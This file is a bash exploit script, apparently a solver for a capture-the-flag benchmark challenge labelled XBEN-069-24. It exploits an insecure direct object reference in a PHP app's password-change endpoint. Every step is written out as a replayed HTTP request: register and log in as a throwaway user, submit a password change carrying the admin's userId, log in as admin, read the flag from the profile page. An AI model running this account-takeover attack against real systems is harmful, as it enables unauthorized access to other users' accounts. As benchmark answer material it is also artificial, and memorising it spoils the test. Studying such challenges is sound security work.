#!/usr/bin/env bash
# XBEN-069-24 — IDOR in password reset. Proxy-mode twin. change_password.php
# trusts a userId field, so after registering and logging in as our own user we
# reset the admin's (row 7) password, log in as admin, and read the flag from
# the profile. All steps are replays, sharing the session cookie jar.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
VICTIM="${2:-7}"
SESSION="xben069p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/register.php"; BASE="$(req_of GET register.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=POST' --set 'path=/api/register.php' \
  --set 'form.username=poc1' --set 'form.email=poc1@example.test' --set 'form.password=Passw0rd!' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=POST' --set 'path=/api/login.php' \
  --set 'form.username=poc1' --set 'form.password=Passw0rd!' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=POST' --set 'path=/api/change_password.php' \
  --set 'form.oldPassword=Passw0rd!' --set 'form.newPassword=Pwned123!' --set 'form.confirmPassword=Pwned123!' \
  --set "form.userId=$VICTIM" >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=POST' --set 'path=/api/login.php' \
  --set 'form.username=admin' --set 'form.password=Pwned123!' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=GET' --set 'path=/profile.php' >/dev/null
print_flag
